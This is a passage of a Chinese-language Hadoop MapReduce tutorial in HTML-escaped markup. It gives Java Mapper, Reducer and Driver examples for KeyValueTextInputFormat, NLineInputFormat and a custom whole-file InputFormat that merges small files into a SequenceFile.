class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; LongWritable(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Text key, Text value, Context context)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;br/&gt;context.write(key, v);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）编写Reducer类&lt;/p&gt;
&lt;pre readability=&quot;14.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;23&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.kv;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.LongWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Reducer;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;KVTextReducer&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Reducer&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;LongWritable&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;LongWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;LongWritable v = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; LongWritable();&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;reduce&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Text key, Iterable&amp;lt;LongWritable&amp;gt; values, &lt;br/&gt;Context context)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;Long sum = &lt;span class=&quot;hljs-number&quot;&gt;0L&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (LongWritable value : values) {&lt;br/&gt;sum += value.get();&lt;br/&gt;}&lt;br/&gt;v.set(sum);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;context.write(key, v);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（3）编写Driver类&lt;/p&gt;
&lt;pre readability=&quot;24&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;42&quot;&gt;package com.atguigu.mr.kv;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.conf.Configuration;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.Path;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.LongWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Job;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.FileInputFormat;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.KeyValueLineRecordReader;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.KeyValueTextInputFormat;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;KVTextDriver&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; main(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] args) throws IOException, ClassNotFoundException, InterruptedException {&lt;/p&gt;&lt;p&gt;&lt;br/&gt;args = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] { &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/input/inputkv&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/output5&quot;&lt;/span&gt; };&lt;/p&gt;&lt;p&gt;Configuration configuration = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Configuration();&lt;/p&gt;&lt;p&gt;&lt;br/&gt;configuration.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(KeyValueLineRecordReader.KEY_VALUE_SEPERATOR, &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;Job job = Job.getInstance(configuration);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setJarByClass(KVTextDriver.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setMapperClass(KVTextMapper.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setReducerClass(KVTextReducer.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setMapOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setMapOutputValueClass(LongWritable.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setOutputValueClass(LongWritable.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;FileInputFormat.setInputPaths(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]));&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setInputFormatClass(KeyValueTextInputFormat.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;FileOutputFormat.setOutputPath(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]));&lt;/p&gt;&lt;p&gt;&lt;br/&gt;boolean result = job.waitForCompletion(&lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);&lt;br/&gt;System.exit(result ? &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; : &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h318nlineinputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.8 NLineInputFormat使用案例&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;1、需求&lt;br/&gt;  对每个单词进行个数统计，要求根据每个输入文件的行数来规定输出多少个切片。此案例要求每三行放入一个切片中。&lt;br/&gt;（1）输入数据&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs nginx&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;banzhang&lt;/span&gt; ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）期望输出数据&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs javascript&quot;&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Number&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; splits:&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2、需求分析&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/krybJx.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;3、代码实现&lt;br/&gt;（1）编写Mapper类
&lt;pre readability=&quot;14.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;23&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.nline;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.LongWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Mapper;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;NLineMapper&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Mapper&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;LongWritable&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;LongWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Text k = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Text();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; LongWritable v = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; LongWritable(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(LongWritable key, Text value, Context context)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;br/&gt;String line = value.toString();&lt;/p&gt;&lt;p&gt;&lt;br/&gt;String[] splited = line.split(&lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (String string : splited) {&lt;br/&gt;k.set(string);&lt;br/&gt;context.write(k, v);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）编写Reducer类&lt;/p&gt;
&lt;pre readability=&quot;13&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;20&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.nline;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.LongWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Reducer;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;NLineReducer&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Reducer&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;LongWritable&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;LongWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;LongWritable v = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; LongWritable();&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;reduce&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Text k, Iterable&amp;lt;LongWritable&amp;gt; values, Context context)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;Long sum = &lt;span class=&quot;hljs-number&quot;&gt;0L&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (LongWritable value : values) {&lt;br/&gt;sum += value.get();&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;v.set(sum);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;context.write(k, v);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（3）编写Driver类&lt;/p&gt;
&lt;pre readability=&quot;21&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;36&quot;&gt;package com.atguigu.mr.nline;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.conf.Configuration;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.Path;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.LongWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Job;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.FileInputFormat;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.NLineInputFormat;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;NLineDriver&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; main(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] args) throws IOException, ClassNotFoundException, InterruptedException {&lt;br/&gt;args = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] { &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/input/inputnline&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/output6&quot;&lt;/span&gt; };&lt;/p&gt;&lt;p&gt;Configuration configuration = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Configuration();&lt;br/&gt;Job job = Job.getInstance(configuration);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;NLineInputFormat.setNumLinesPerSplit(job, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;);&lt;br/&gt;job.setInputFormatClass(NLineInputFormat.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);  &lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setJarByClass(NLineDriver.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setMapperClass(NLineMapper.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setReducerClass(NLineReducer.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setMapOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setMapOutputValueClass(LongWritable.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setOutputValueClass(LongWritable.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;FileInputFormat.setInputPaths(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]));&lt;br/&gt;FileOutputFormat.setOutputPath(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]));&lt;/p&gt;&lt;p&gt;&lt;br/&gt;boolean result = job.waitForCompletion(&lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);&lt;br/&gt;System.exit(result ? &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; : &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;4．测试&lt;br/&gt;（1）输入数据&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs nginx&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;banzhang&lt;/span&gt; ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）输出结果的切片数，如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryzeH.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h319inputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.9 自定义InputFormat&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryjyD.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h3110inputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.10 自定义InputFormat案例实操&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;  无论HDFS还是MapReduce，在&lt;code&gt;处理小文件&lt;/code&gt;时效率都非常低，但又难免面临处理大量小文件的场景，此时，就需要有相应解决方案。可以自定义InputFormat实现小文件的合并。&lt;br/&gt;1、需求&lt;br/&gt;  将多个小文件合并成一个SequenceFile文件（SequenceFile文件是Hadoop用来存储二进制形式的key-value对的文件格式），SequenceFile里面存储着多个文件，存储的形式为&lt;code&gt;文件路径+名称为key&lt;/code&gt;，&lt;code&gt;文件内容为value&lt;/code&gt;。&lt;br/&gt;（1）输入数据&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6kSf.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;（2）期望输出文件格式&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6PYt.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;2、需求分析&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6emQ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;3．程序实现&lt;br/&gt;（1）自定义InputFromat
&lt;pre readability=&quot;13.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;21&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.inputformat;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.Path;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.BytesWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.InputSplit;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.JobContext;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.RecordReader;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.TaskAttemptContext;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.FileInputFormat;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;WholeFileInputformat&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;FileInputFormat&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;BytesWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;isSplitable&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(JobContext context, Path filename)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; RecordReader&amp;lt;Text, BytesWritable&amp;gt; &lt;span class=&quot;hljs-title&quot;&gt;createRecordReader&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(InputSplit split, TaskAttemptContext context)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;br/&gt;WholeRecordReader recordReader = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; WholeRecordReader();&lt;br/&gt;recordReader.initialize(split, context);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; recordReader;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）自定义RecordReader类&lt;/p&gt;
&lt;pre readability=&quot;27&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;48&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.inputformat;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.conf.Configuration;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.FSDataInputStream;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.FileSystem;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.Path;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.BytesWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.IOUtils;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; 